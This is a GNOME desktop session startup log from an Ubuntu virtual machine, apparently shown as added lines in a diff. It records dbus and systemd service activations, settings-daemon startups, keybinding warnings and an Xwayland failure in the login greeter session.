+Apr 13 14:56:51 vmuser-Standard-PC-i440FX-PIIX-1996 at-spi-dbus-bus.desktop[1834]: dbus-daemon[1834]: Successfully activated service 'org.a11y.atspi.Registry'
+Apr 13 14:56:51 vmuser-Standard-PC-i440FX-PIIX-1996 at-spi-dbus-bus.desktop[1890]: SpiRegistry daemon is running with well-known name - org.a11y.atspi.Registry
+Apr 13 14:56:51 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[1821]: Unset XDG_SESSION_ID, getCurrentSessionProxy() called outside a user session. Asking logind directly.
+Apr 13 14:56:51 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[1821]: Will monitor session 2
+Apr 13 14:56:51 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[1613]: [session uid=1000 pid=1613] Activating service name='org.gnome.Shell.Screencast' requested by ':1.34' (uid=1000 pid=1821 comm="/usr/bin/gnome-shell" label="unconfined")
+Apr 13 14:56:51 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[1613]: [session uid=1000 pid=1613] Activating service name='org.gnome.Shell.CalendarServer' requested by ':1.34' (uid=1000 pid=1821 comm="/usr/bin/gnome-shell" label="unconfined")
+Apr 13 14:56:52 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[1613]: [session uid=1000 pid=1613] Activating service name='org.gnome.Shell.Notifications' requested by ':1.34' (uid=1000 pid=1821 comm="/usr/bin/gnome-shell" label="unconfined")
+Apr 13 14:56:52 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[1613]: [session uid=1000 pid=1613] Activating via systemd: service name='org.gnome.evolution.dataserver.Sources5' unit='evolution-source-registry.service' requested by ':1.39' (uid=1000 pid=1915 comm="/usr/libexec/gnome-shell-calendar-server" label="unconfined")
+Apr 13 14:56:52 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[1821]: Unable to connect to ibus: Could not connect: Connection refused
+Apr 13 14:56:52 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Starting evolution-source-registry.service - Evolution source registry...
+Apr 13 14:56:52 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Started org.gnome.Shell@wayland.service - GNOME Shell on Wayland.
+Apr 13 14:56:52 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Reached target gnome-session-initialized.target - GNOME Session is initialized.
+Apr 13 14:56:52 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: gnome-session-x11-services.target - GNOME session X11 services is inactive.
+Apr 13 14:56:52 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Dependency failed for org.gnome.SettingsDaemon.XSettings.service - GNOME XSettings service.
+Apr 13 14:56:52 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: org.gnome.SettingsDaemon.XSettings.service: Job org.gnome.SettingsDaemon.XSettings.service/start failed with result 'dependency'.
+Apr 13 14:56:52 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: gnome-session-x11-services-ready.target: Job gnome-session-x11-services-ready.target/verify-active failed with result 'dependency'.
+Apr 13 14:56:52 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Reached target gnome-session@ubuntu.target - GNOME Session (session: ubuntu).
+Apr 13 14:56:52 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Reached target org.gnome.SettingsDaemon.XSettings.target - GNOME XSettings target.
+Apr 13 14:56:52 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Starting gnome-session-signal-init.service - Signal initialization done to GNOME Session Manager...
+Apr 13 14:56:52 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Starting org.freedesktop.IBus.session.GNOME.service - IBus Daemon for GNOME...
+Apr 13 14:56:52 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Starting org.gnome.SettingsDaemon.A11ySettings.service - GNOME accessibility service...
+Apr 13 14:56:52 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Starting org.gnome.SettingsDaemon.Color.service - GNOME color management service...
+Apr 13 14:56:52 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Starting org.gnome.SettingsDaemon.Datetime.service - GNOME date & time service...
+Apr 13 14:56:52 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Starting org.gnome.SettingsDaemon.Housekeeping.service - GNOME maintenance of expirable data service...
+Apr 13 14:56:52 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Starting org.gnome.SettingsDaemon.Keyboard.service - GNOME keyboard configuration service...
+Apr 13 14:56:52 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Starting org.gnome.SettingsDaemon.MediaKeys.service - GNOME keyboard shortcuts service...
+Apr 13 14:56:52 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Starting org.gnome.SettingsDaemon.Power.service - GNOME power management service...
+Apr 13 14:56:52 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Starting org.gnome.SettingsDaemon.PrintNotifications.service - GNOME printer notifications service...
+Apr 13 14:56:52 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Starting org.gnome.SettingsDaemon.Rfkill.service - GNOME RFKill support service...
+Apr 13 14:56:52 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Starting org.gnome.SettingsDaemon.ScreensaverProxy.service - GNOME FreeDesktop screensaver service...
+Apr 13 14:56:52 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Starting org.gnome.SettingsDaemon.Sharing.service - GNOME file sharing service...
+Apr 13 14:56:52 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Starting org.gnome.SettingsDaemon.Smartcard.service - GNOME smartcard service...
+Apr 13 14:56:52 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Starting org.gnome.SettingsDaemon.Sound.service - GNOME sound sample caching service...
+Apr 13 14:56:52 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Starting org.gnome.SettingsDaemon.Wacom.service - GNOME Wacom tablet support service...
+Apr 13 14:56:52 vmuser-Standard-PC-i440FX-PIIX-1996 spice-vdagent[1963]: vdagent virtio channel /dev/virtio-ports/com.redhat.spice.0 does not exist, exiting
+Apr 13 14:56:52 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Finished gnome-session-signal-init.service - Signal initialization done to GNOME Session Manager.
+Apr 13 14:56:52 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: app-gnome-spice\x2dvdagent-1963.scope: PID 1963 vanished before we could move it to target cgroup '/user.slice/user-1000.slice/user@1000.service/app.slice/app-gnome-spice\x2dvdagent-1963.scope', skipping: No such process
+Apr 13 14:56:52 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: app-gnome-spice\x2dvdagent-1963.scope: No PIDs left to attach to the scope's control group, refusing.
+Apr 13 14:56:52 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: app-gnome-spice\x2dvdagent-1963.scope: Failed with result 'resources'.
+Apr 13 14:56:52 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Failed to start app-gnome-spice\x2dvdagent-1963.scope - Application launched by gnome-session-binary.
+Apr 13 14:56:52 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[1821]: Gio.UnixInputStream has been moved to a separate platform-specific library. Please update your code to use GioUnix.InputStream instead.
+                                                                       0 inhibit() ["resource:///org/gnome/shell/misc/loginManager.js":209:8]
+                                                                       1 InterpretGeneratorResume() ["self-hosted":1461:33]
+                                                                       2 AsyncFunctionNext() ["self-hosted":852:26]
+                                                                       3 anonymous() ["resource:///org/gnome/shell/ui/init.js":21:19]
+Apr 13 14:56:52 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-session-binary[1784]: Entering running state
+Apr 13 14:56:53 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: rfkill: input handler disabled
+Apr 13 14:56:53 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-session[1784]: gnome-session-binary[1784]: GnomeDesktop-WARNING: Could not create transient scope for PID 1983: GDBus.Error:org.freedesktop.DBus.Error.UnixProcessIdUnknown: Failed to set unit properties: No such process
+Apr 13 14:56:53 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-session-binary[1784]: GnomeDesktop-WARNING: Could not create transient scope for PID 1983: GDBus.Error:org.freedesktop.DBus.Error.UnixProcessIdUnknown: Failed to set unit properties: No such process
+Apr 13 14:56:53 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-session[1784]: gnome-session-binary[1784]: GnomeDesktop-WARNING: Could not create transient scope for PID 1986: GDBus.Error:org.freedesktop.DBus.Error.UnixProcessIdUnknown: Failed to set unit properties: No such process
+Apr 13 14:56:53 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-session-binary[1784]: GnomeDesktop-WARNING: Could not create transient scope for PID 1986: GDBus.Error:org.freedesktop.DBus.Error.UnixProcessIdUnknown: Failed to set unit properties: No such process
+Apr 13 14:56:53 vmuser-Standard-PC-i440FX-PIIX-1996 at-spi2-registr[1890]: Failed to register client: GDBus.Error:org.gnome.SessionManager.AlreadyRegistered: Unable to register client
+Apr 13 14:56:53 vmuser-Standard-PC-i440FX-PIIX-1996 at-spi2-registr[1890]: Unable to register client with session manager
+Apr 13 14:56:53 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Started org.gnome.SettingsDaemon.A11ySettings.service - GNOME accessibility service.
+Apr 13 14:56:53 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Started org.gnome.SettingsDaemon.Datetime.service - GNOME date & time service.
+Apr 13 14:56:53 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Started org.gnome.SettingsDaemon.ScreensaverProxy.service - GNOME FreeDesktop screensaver service.
+Apr 13 14:56:53 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Started org.gnome.SettingsDaemon.Smartcard.service - GNOME smartcard service.
+Apr 13 14:56:53 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Started org.gnome.SettingsDaemon.Rfkill.service - GNOME RFKill support service.
+Apr 13 14:56:53 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Started org.gnome.SettingsDaemon.Housekeeping.service - GNOME maintenance of expirable data service.
+Apr 13 14:56:53 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Started app-gnome-org.gnome.Evolution\x2dalarm\x2dnotify-2008.scope - Application launched by gnome-session-binary.
+Apr 13 14:56:53 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Started app-gnome-org.gnome.SettingsDaemon.DiskUtilityNotify-1987.scope - Application launched by gnome-session-binary.
+Apr 13 14:56:53 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Started app-gnome-ubuntu\x2dreport\x2don\x2dupgrade-2050.scope - Application launched by gnome-session-binary.
+Apr 13 14:56:53 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Reached target org.gnome.SettingsDaemon.A11ySettings.target - GNOME accessibility target.
+Apr 13 14:56:53 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Reached target org.gnome.SettingsDaemon.Datetime.target - GNOME date & time target.
+Apr 13 14:56:53 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Reached target org.gnome.SettingsDaemon.Housekeeping.target - GNOME maintenance of expirable data target.
+Apr 13 14:56:53 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Reached target org.gnome.SettingsDaemon.Rfkill.target - GNOME RFKill support target.
+Apr 13 14:56:53 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Reached target org.gnome.SettingsDaemon.ScreensaverProxy.target - GNOME FreeDesktop screensaver target.
+Apr 13 14:56:53 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Reached target org.gnome.SettingsDaemon.Smartcard.target - GNOME smartcard target.
+Apr 13 14:56:53 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Started org.gnome.SettingsDaemon.Sound.service - GNOME sound sample caching service.
+Apr 13 14:56:53 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Reached target org.gnome.SettingsDaemon.Sound.target - GNOME sound sample caching target.
+Apr 13 14:56:53 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-session[1784]: gnome-session-binary[1784]: GnomeDesktop-WARNING: Could not create transient scope for PID 1992: GDBus.Error:org.freedesktop.DBus.Error.UnixProcessIdUnknown: Failed to set unit properties: No such process
+Apr 13 14:56:53 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-session-binary[1784]: GnomeDesktop-WARNING: Could not create transient scope for PID 1992: GDBus.Error:org.freedesktop.DBus.Error.UnixProcessIdUnknown: Failed to set unit properties: No such process
+Apr 13 14:56:53 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Started org.gnome.SettingsDaemon.Sharing.service - GNOME file sharing service.
+Apr 13 14:56:53 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Reached target org.gnome.SettingsDaemon.Sharing.target - GNOME file sharing target.
+Apr 13 14:56:53 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[1613]: [session uid=1000 pid=1613] Activating via systemd: service name='org.gtk.vfs.UDisks2VolumeMonitor' unit='gvfs-udisks2-volume-monitor.service' requested by ':1.34' (uid=1000 pid=1821 comm="/usr/bin/gnome-shell" label="unconfined")
+Apr 13 14:56:53 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Started org.gnome.SettingsDaemon.PrintNotifications.service - GNOME printer notifications service.
+Apr 13 14:56:53 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Reached target org.gnome.SettingsDaemon.PrintNotifications.target - GNOME printer notifications target.
+Apr 13 14:56:53 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Starting gvfs-udisks2-volume-monitor.service - Virtual filesystem service - disk device monitor...
+Apr 13 14:56:53 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[1613]: [session uid=1000 pid=1613] Successfully activated service 'org.gnome.Shell.Notifications'
+Apr 13 14:56:53 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[1613]: [session uid=1000 pid=1613] Activating service name='org.freedesktop.portal.IBus' requested by ':1.54' (uid=1000 pid=1937 comm="/usr/bin/ibus-daemon --panel disable" label="unconfined")
+Apr 13 14:56:53 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Started org.freedesktop.IBus.session.GNOME.service - IBus Daemon for GNOME.
+Apr 13 14:56:53 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[1613]: [session uid=1000 pid=1613] Successfully activated service 'org.freedesktop.portal.IBus'
+Apr 13 14:56:53 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[1613]: [session uid=1000 pid=1613] Successfully activated service 'org.gtk.vfs.UDisks2VolumeMonitor'
+Apr 13 14:56:53 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Started gvfs-udisks2-volume-monitor.service - Virtual filesystem service - disk device monitor.
+Apr 13 14:56:53 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[1613]: [session uid=1000 pid=1613] Activating via systemd: service name='org.gtk.vfs.AfcVolumeMonitor' unit='gvfs-afc-volume-monitor.service' requested by ':1.34' (uid=1000 pid=1821 comm="/usr/bin/gnome-shell" label="unconfined")
+Apr 13 14:56:53 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Starting gvfs-afc-volume-monitor.service - Virtual filesystem service - Apple File Conduit monitor...
+Apr 13 14:56:53 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[1613]: [session uid=1000 pid=1613] Successfully activated service 'org.gtk.vfs.AfcVolumeMonitor'
+Apr 13 14:56:53 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Started gvfs-afc-volume-monitor.service - Virtual filesystem service - Apple File Conduit monitor.
+Apr 13 14:56:53 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[1613]: [session uid=1000 pid=1613] Activating via systemd: service name='org.gtk.vfs.GPhoto2VolumeMonitor' unit='gvfs-gphoto2-volume-monitor.service' requested by ':1.34' (uid=1000 pid=1821 comm="/usr/bin/gnome-shell" label="unconfined")
+Apr 13 14:56:53 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Starting gvfs-gphoto2-volume-monitor.service - Virtual filesystem service - digital camera monitor...
+Apr 13 14:56:53 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[1613]: [session uid=1000 pid=1613] Successfully activated service 'org.gtk.vfs.GPhoto2VolumeMonitor'
+Apr 13 14:56:53 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[1613]: [session uid=1000 pid=1613] Activating via systemd: service name='org.gtk.vfs.MTPVolumeMonitor' unit='gvfs-mtp-volume-monitor.service' requested by ':1.34' (uid=1000 pid=1821 comm="/usr/bin/gnome-shell" label="unconfined")
+Apr 13 14:56:53 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Started gvfs-gphoto2-volume-monitor.service - Virtual filesystem service - digital camera monitor.
+Apr 13 14:56:53 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Starting gvfs-mtp-volume-monitor.service - Virtual filesystem service - Media Transfer Protocol monitor...
+Apr 13 14:56:53 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[1613]: [session uid=1000 pid=1613] Successfully activated service 'org.gtk.vfs.MTPVolumeMonitor'
+Apr 13 14:56:53 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[1613]: [session uid=1000 pid=1613] Activating via systemd: service name='org.gtk.vfs.GoaVolumeMonitor' unit='gvfs-goa-volume-monitor.service' requested by ':1.34' (uid=1000 pid=1821 comm="/usr/bin/gnome-shell" label="unconfined")
+Apr 13 14:56:53 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Started gvfs-mtp-volume-monitor.service - Virtual filesystem service - Media Transfer Protocol monitor.
+Apr 13 14:56:53 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Starting gvfs-goa-volume-monitor.service - Virtual filesystem service - GNOME Online Accounts monitor...
+Apr 13 14:56:53 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[1613]: [session uid=1000 pid=1613] Activating service name='org.gnome.OnlineAccounts' requested by ':1.67' (uid=1000 pid=2187 comm="/usr/libexec/gvfs-goa-volume-monitor" label="unconfined")
+Apr 13 14:56:54 vmuser-Standard-PC-i440FX-PIIX-1996 goa-daemon[2192]: goa-daemon version 3.50.4 starting
+Apr 13 14:56:54 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[1613]: [session uid=1000 pid=1613] Activating service name='org.gnome.Identity' requested by ':1.69' (uid=1000 pid=2192 comm="/usr/libexec/goa-daemon" label="unconfined")
+Apr 13 14:56:54 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[1613]: [session uid=1000 pid=1613] Successfully activated service 'org.gnome.OnlineAccounts'
+Apr 13 14:56:54 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[1613]: [session uid=1000 pid=1613] Successfully activated service 'org.gtk.vfs.GoaVolumeMonitor'
+Apr 13 14:56:54 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Started gvfs-goa-volume-monitor.service - Virtual filesystem service - GNOME Online Accounts monitor.
+Apr 13 14:56:54 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[1613]: [session uid=1000 pid=1613] Successfully activated service 'org.gnome.Identity'
+Apr 13 14:56:54 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[1821]: Error looking up permission: GDBus.Error:org.freedesktop.portal.Error.NotFound: No entry for geolocation
+Apr 13 14:56:54 vmuser-Standard-PC-i440FX-PIIX-1996 polkitd[720]: Registered Authentication Agent for unix-session:2 (system bus name :1.77 [/usr/bin/gnome-shell], object path /org/freedesktop/PolicyKit1/AuthenticationAgent, locale en_US.UTF-8)
+Apr 13 14:56:54 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[1613]: [session uid=1000 pid=1613] Successfully activated service 'org.gnome.evolution.dataserver.Sources5'
+Apr 13 14:56:54 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Started evolution-source-registry.service - Evolution source registry.
+Apr 13 14:56:54 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[1613]: [session uid=1000 pid=1613] Activating via systemd: service name='org.gnome.evolution.dataserver.Calendar8' unit='evolution-calendar-factory.service' requested by ':1.39' (uid=1000 pid=1915 comm="/usr/libexec/gnome-shell-calendar-server" label="unconfined")
+Apr 13 14:56:54 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Starting evolution-calendar-factory.service - Evolution calendar service...
+Apr 13 14:56:54 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[1613]: [session uid=1000 pid=1613] Successfully activated service 'org.gnome.Shell.CalendarServer'
+Apr 13 14:56:54 vmuser-Standard-PC-i440FX-PIIX-1996 NetworkManager[755]: <info>  [1776110214.2961] agent-manager: agent[dc58544babf824a6,:1.77/org.gnome.Shell.NetworkAgent/1000]: agent registered
+Apr 13 14:56:54 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[1613]: [session uid=1000 pid=1613] Successfully activated service 'org.gnome.evolution.dataserver.Calendar8'
+Apr 13 14:56:54 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Started evolution-calendar-factory.service - Evolution calendar service.
+Apr 13 14:56:54 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[1613]: [session uid=1000 pid=1613] Activating via systemd: service name='org.gnome.evolution.dataserver.AddressBook10' unit='evolution-addressbook-factory.service' requested by ':1.71' (uid=1000 pid=2228 comm="/usr/libexec/evolution-calendar-factory" label="unconfined")
+Apr 13 14:56:54 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Starting evolution-addressbook-factory.service - Evolution address book service...
+Apr 13 14:56:54 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[1613]: [session uid=1000 pid=1613] Activating via systemd: service name='ca.desrt.dconf' unit='dconf.service' requested by ':1.34' (uid=1000 pid=1821 comm="/usr/bin/gnome-shell" label="unconfined")
+Apr 13 14:56:54 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Starting dconf.service - User preferences database...
+Apr 13 14:56:54 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[1613]: [session uid=1000 pid=1613] Successfully activated service 'ca.desrt.dconf'
+Apr 13 14:56:54 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Started dconf.service - User preferences database.
+Apr 13 14:56:54 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[1613]: [session uid=1000 pid=1613] Successfully activated service 'org.gnome.evolution.dataserver.AddressBook10'
+Apr 13 14:56:54 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Started evolution-addressbook-factory.service - Evolution address book service.
+Apr 13 14:56:54 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[1821]: Failed to import DBusMenu, quicklists are not available: Error: Requiring Dbusmenu, version none: Typelib file for namespace 'Dbusmenu' (any version) not found
+Apr 13 14:56:54 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[1821]: Failed to import DBusMenu, quicklists are not available: Error: Requiring Dbusmenu, version none: Typelib file for namespace 'Dbusmenu' (any version) not found
+Apr 13 14:56:54 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[1821]: Failed to import DBusMenu, quicklists are not available: Error: Requiring Dbusmenu, version none: Typelib file for namespace 'Dbusmenu' (any version) not found
+Apr 13 14:56:54 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[1613]: [session uid=1000 pid=1613] Activating service name='org.freedesktop.FileManager1' requested by ':1.34' (uid=1000 pid=1821 comm="/usr/bin/gnome-shell" label="unconfined")
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[1821]: Window manager warning: Overwriting existing binding of keysym 38 with keysym 38 (keycode 11).
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[1821]: Window manager warning: Overwriting existing binding of keysym 33 with keysym 33 (keycode c).
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[1821]: Window manager warning: Overwriting existing binding of keysym 31 with keysym 31 (keycode a).
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[1821]: Window manager warning: Overwriting existing binding of keysym 38 with keysym 38 (keycode 11).
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[1821]: Window manager warning: Overwriting existing binding of keysym 35 with keysym 35 (keycode e).
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[1821]: Window manager warning: Overwriting existing binding of keysym 33 with keysym 33 (keycode c).
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[1821]: Window manager warning: Overwriting existing binding of keysym 32 with keysym 32 (keycode b).
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[1821]: Window manager warning: Overwriting existing binding of keysym 37 with keysym 37 (keycode 10).
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[1821]: Window manager warning: Overwriting existing binding of keysym 35 with keysym 35 (keycode e).
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[1821]: Window manager warning: Overwriting existing binding of keysym 39 with keysym 39 (keycode 12).
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[1821]: Window manager warning: Overwriting existing binding of keysym 31 with keysym 31 (keycode a).
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[1821]: Window manager warning: Overwriting existing binding of keysym 37 with keysym 37 (keycode 10).
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[1821]: Window manager warning: Overwriting existing binding of keysym 36 with keysym 36 (keycode f).
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[1821]: Window manager warning: Overwriting existing binding of keysym 39 with keysym 39 (keycode 12).
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[1821]: Window manager warning: Overwriting existing binding of keysym 36 with keysym 36 (keycode f).
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[1821]: Window manager warning: Overwriting existing binding of keysym 32 with keysym 32 (keycode b).
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[1821]: Window manager warning: Overwriting existing binding of keysym 34 with keysym 34 (keycode d).
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[1821]: Window manager warning: Overwriting existing binding of keysym 34 with keysym 34 (keycode d).
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[1924]: Failed to initialize glamor, falling back to sw
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 nautilus[2298]: Connecting to org.freedesktop.Tracker3.Miner.Files
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[1613]: [session uid=1000 pid=1613] Successfully activated service 'org.freedesktop.FileManager1'
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[1821]: GNOME Shell started at Mon Apr 13 2026 14:56:52 GMT-0500 (Central Daylight Time)
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[1821]: Registering session with GDM
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[1160]: Connection to xwayland lost
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[1160]: Xwayland terminated, exiting since it was mandatory
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[1160]: JS ERROR: Gio.IOErrorEnum: Xwayland exited unexpectedly
+                                                                       @resource:///org/gnome/shell/ui/init.js:21:20
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[1160]: Execution of main.js threw exception: Module resource:///org/gnome/shell/ui/init.js threw an exception
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 gdm-launch-environment][1009]: pam_unix(gdm-launch-environment:session): session closed for user gdm
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 systemd-logind[733]: Session c1 logged out. Waiting for processes to exit.
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 gdm3[1001]: Gdm: on_display_removed: assertion 'GDM_IS_REMOTE_DISPLAY (display)' failed
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 snapd-desktop-i[2208]: New theme: gtk=Adwaita icon=Adwaita cursor=Adwaita, sound=Yaru
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 snapd-desktop-i[2208]: All available theme snaps installed
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Started org.gnome.SettingsDaemon.Color.service - GNOME color management service.
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Started org.gnome.SettingsDaemon.Keyboard.service - GNOME keyboard configuration service.
